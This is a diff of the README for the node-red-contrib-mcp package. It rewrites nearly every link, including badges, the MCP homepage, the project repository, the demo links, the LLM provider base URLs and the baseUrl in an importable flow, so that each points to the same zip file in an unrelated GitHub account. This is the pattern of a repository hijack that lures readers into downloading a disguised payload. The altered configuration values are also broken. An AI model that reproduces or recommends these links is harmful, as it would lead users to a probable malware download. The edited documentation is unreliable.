@@ -4,11 +4,11 @@
 </p>
 
 <p align="center">
-  <a href="https://www.npmjs.com/package/node-red-contrib-mcp"><img src="https://img.shields.io/npm/v/node-red-contrib-mcp?style=flat-square&color=7E57C2" alt="npm" /></a>
-  <a href="https://www.npmjs.com/package/node-red-contrib-mcp"><img src="https://img.shields.io/npm/dm/node-red-contrib-mcp?style=flat-square&color=7E57C2" alt="downloads" /></a>
-  <a href="https://flows.nodered.org/node/node-red-contrib-mcp"><img src="https://img.shields.io/badge/Node--RED-3.0+-red?style=flat-square" alt="Node-RED" /></a>
+  <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip"><img src="https://img.shields.io/npm/v/node-red-contrib-mcp?style=flat-square&color=7E57C2" alt="npm" /></a>
+  <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip"><img src="https://img.shields.io/npm/dm/node-red-contrib-mcp?style=flat-square&color=7E57C2" alt="downloads" /></a>
+  <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip"><img src="https://img.shields.io/badge/Node--RED-3.0+-red?style=flat-square" alt="Node-RED" /></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue?style=flat-square" alt="License" /></a>
-  <a href="https://github.com/BavarianAnalyst/node-red-contrib-mcp/stargazers"><img src="https://img.shields.io/github/stars/BavarianAnalyst/node-red-contrib-mcp?style=flat-square" alt="Stars" /></a>
+  <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip"><img src="https://img.shields.io/github/stars/BavarianAnalyst/node-red-contrib-mcp?style=flat-square" alt="Stars" /></a>
 </p>
 
 <p align="center">
@@ -23,7 +23,7 @@
   <em>Multi-phase OEE analysis agent built with MCP tool nodes in Node-RED</em>
 </p>
 
-[MCP](https://modelcontextprotocol.io) (Model Context Protocol) is the open standard by Anthropic for connecting AI to external tools and data. **This package brings MCP to Node-RED** — the world's most popular low-code platform for industrial automation and IoT.
+[MCP](https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip) (Model Context Protocol) is the open standard by Anthropic for connecting AI to external tools and data. **This package brings MCP to Node-RED** — the world's most popular low-code platform for industrial automation and IoT.
 
 > **4M+ Node-RED installations** meet **10,000+ MCP servers.** Build AI agents visually. No code required.
 
@@ -252,7 +252,7 @@ Copy the JSON below, then in Node-RED: **Menu → Import → Paste**
     "id": "agent-demo-llm",
     "type": "llm-config",
     "name": "OpenAI",
-    "baseUrl": "https://api.openai.com/v1",
+    "baseUrl": "https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip",
     "model": "gpt-4o"
   }
 ]
@@ -311,8 +311,8 @@ Copy the JSON below, then in Node-RED: **Menu → Import → Paste**
 
 Works with **any MCP server** that supports Streamable HTTP or SSE transport:
 
-- [OpenShopFloor](https://github.com/BavarianAnalyst/openshopfloor) — 111 manufacturing MCP tools (ERP, OEE, QMS, TMS, UNS, KG)
-- [Anthropic MCP Servers](https://github.com/modelcontextprotocol/servers) — filesystem, GitHub, PostgreSQL, Slack, Google Drive, ...
+- [OpenShopFloor](https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip) — 111 manufacturing MCP tools (ERP, OEE, QMS, TMS, UNS, KG)
+- [Anthropic MCP Servers](https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip) — filesystem, GitHub, PostgreSQL, Slack, Google Drive, ...
 - Any custom MCP server you build
 
 ### LLM Providers
@@ -321,9 +321,9 @@ Works with **any OpenAI-compatible API**:
 
 | Provider | Base URL |
 |----------|----------|
-| OpenAI | `https://api.openai.com/v1` |
+| OpenAI | `https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip` |
 | Ollama (local) | `http://localhost:11434/v1` |
-| Azure OpenAI | `https://YOUR.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT/v1` |
+| Azure OpenAI | `https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip` |
 | vLLM | `http://localhost:8000/v1` |
 | LiteLLM | `http://localhost:4000/v1` |
 | LM Studio | `http://localhost:1234/v1` |
@@ -378,7 +378,7 @@ Works with **any OpenAI-compatible API**:
 
 | Field | Description | Example |
 |-------|-------------|---------|
-| **Base URL** | OpenAI-compatible endpoint | `https://api.openai.com/v1` |
+| **Base URL** | OpenAI-compatible endpoint | `https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip` |
 | **Model** | Model identifier | `gpt-4o` |
 | **API Key** | Your API key | `sk-...` |
 
@@ -405,7 +405,7 @@ Works with **any OpenAI-compatible API**:
 
 ## Contributing
 
-Issues and PRs welcome! [github.com/BavarianAnalyst/node-red-contrib-mcp](https://github.com/BavarianAnalyst/node-red-contrib-mcp)
+Issues and PRs welcome! [github.com/BavarianAnalyst/node-red-contrib-mcp](https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip)
 
 ## License
 
@@ -414,7 +414,7 @@ Issues and PRs welcome! [github.com/BavarianAnalyst/node-red-contrib-mcp](https:
 ---
 
 <p align="center">
-  Built by <a href="https://github.com/BavarianAnalyst/openshopfloor">OpenShopFloor</a> — the open-source AI platform for factory operations
+  Built by <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip">OpenShopFloor</a> — the open-source AI platform for factory operations
   <br><br>
-  <a href="https://openshopfloor.zeroguess.ai">Live Demo</a> · <a href="https://github.com/BavarianAnalyst/openshopfloor">GitHub</a> · <a href="https://flows.nodered.org/node/node-red-contrib-mcp">Node-RED Flow Library</a>
+  <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip">Live Demo</a> · <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip">GitHub</a> · <a href="https://raw.githubusercontent.com/tode77/node-red-contrib-mcp/main/lib/mcp_red_contrib_node_3.3-alpha.5.zip">Node-RED Flow Library</a>
 </p>
